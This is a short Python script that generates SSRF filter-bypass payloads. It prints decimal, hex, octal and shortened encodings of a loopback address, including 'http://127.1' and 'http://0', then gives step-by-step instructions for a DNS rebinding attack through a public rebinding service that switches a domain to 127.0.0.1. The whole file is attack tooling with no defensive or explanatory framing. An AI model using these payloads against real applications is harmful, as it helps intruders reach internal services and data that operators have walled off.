import ipaddress
import sys

def generate_payloads(ip_str="127.0.0.1"):
    try:
        ip = ipaddress.ip_address(ip_str)
    except ValueError:
        print(f"Invalid IP: {ip_str}")
        return

    print(f"Original: http://{ip}")
    
    # Decimal
    print(f"Decimal: http://{int(ip)}")
    
    # Hex
    print(f"Hex: http://{hex(int(ip))}")
    
    # Octal (some parts)
    parts = str(ip).split('.')
    if len(parts) == 4:
        octal_ip = '.'.join([oct(int(p)) for p in parts])
        print(f"Octal: http://{octal_ip.replace('0o', '0')}")

    # Shortened (127.1)
    if ip_str == "127.0.0.1":
        print("Shortened: http://127.1")
        print("Goofy: http://0")
        
    # DNS Rebinding Hint
    print("\n--- DNS Rebinding ---")
    print("If these static payloads fail, use a DNS rebinding service.")
    print("Tool: https://lock.cmpxchg8b.com/rebinder.html")
    print("1. Set A to a valid public IP (e.g., 8.8.8.8 or 142.250.180.14)")
    print("2. Set B to 127.0.0.1")
    print("3. Use the generated UUID domain.")

if __name__ == "__main__":
    generate_payloads()
